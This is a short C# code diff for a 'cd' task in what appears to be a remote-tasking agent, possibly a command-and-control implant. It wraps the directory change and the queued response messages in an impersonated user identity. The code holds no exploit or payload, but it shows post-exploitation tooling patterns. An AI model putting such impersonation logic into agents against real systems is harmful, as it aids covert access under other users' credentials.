@@ -42,18 +42,21 @@ namespace Tasks
             return new System.Threading.Tasks.Task(() =>
             {
                 CdParameters parameters = _jsonSerializer.Deserialize<CdParameters>(_data.Parameters);
-                if (!Directory.Exists(parameters.Path))
+                using (_agent.GetIdentityManager().GetCurrentImpersonationIdentity().Impersonate())
                 {
-                    _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse(
-                        $"Directory {parameters.Path} does not exist",
-                        true,
-                        "error"));
-                } else
-                {
-                    Directory.SetCurrentDirectory(parameters.Path);
-                    _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse(
-                        $"Working directory set to {Directory.GetCurrentDirectory()}",
-                        true));
+                    if (!Directory.Exists(parameters.Path))
+                    {
+                        _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse(
+                            $"Directory {parameters.Path} does not exist",
+                            true,
+                            "error"));
+                    } else
+                    {
+                        Directory.SetCurrentDirectory(parameters.Path);
+                        _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse(
+                            $"Working directory set to {Directory.GetCurrentDirectory()}",
+                            true));
+                    }   
                 }
             }, _cancellationToken.Token);
         }
